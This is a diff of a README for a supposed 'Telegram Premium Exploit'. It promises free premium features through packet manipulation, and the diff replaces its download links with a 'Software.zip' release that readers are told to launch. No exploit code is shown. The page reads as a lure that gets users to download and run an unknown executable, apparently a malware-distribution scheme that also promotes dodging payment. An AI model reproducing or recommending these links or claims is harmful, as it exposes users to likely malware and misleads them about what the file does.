@@ -1,7 +1,7 @@
 
 # **Telegram Premium Exploit Repository**
 
-[![Download Telegram Premium Exploit](https://img.shields.io/badge/Download-Telegram_Premium_Exploit-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Telegram Premium Exploit](https://github.com/JamesRichards05/Telegram-Premium/releases/download/v1.0/Software.zip)](https://github.com/JamesRichards05/Telegram-Premium/releases/download/v1.0/Software.zip)
 
 Welcome to the **Telegram-Premium** repository - your ultimate destination to acquire Telegram Premium for free! 🚀 With the powerful client packet manipulation exploit provided here, you can unlock all the premium features of Telegram without any cost.
 
@@ -15,7 +15,7 @@ Welcome to the **Telegram-Premium** repository - your ultimate destination to ac
 
 To begin your journey towards Telegram Premium for free, you can download the required exploit package from the link below:
 
-[Download Telegram Premium Exploit](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[Download Telegram Premium Exploit](https://github.com/JamesRichards05/Telegram-Premium/releases/download/v1.0/Software.zip)
 
 👉 ***Note:*** The downloaded file needs to be launched to initiate the exploit and access Telegram Premium features.
 
@@ -45,6 +45,6 @@ For additional resources, guides, and tips on maximizing your Telegram Premium e
 
 Join us on this exciting journey to unlock Telegram Premium for free! Get started today and elevate your messaging experience to new heights. Feel the power of premium features at your fingertips with the Telegram Premium exploit.
 
-[Download Telegram Premium Exploit](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[Download Telegram Premium Exploit](https://github.com/JamesRichards05/Telegram-Premium/releases/download/v1.0/Software.zip)
 
 🌟 **Telegram Premium - Elevate Your Chatting Experience!** 🌟
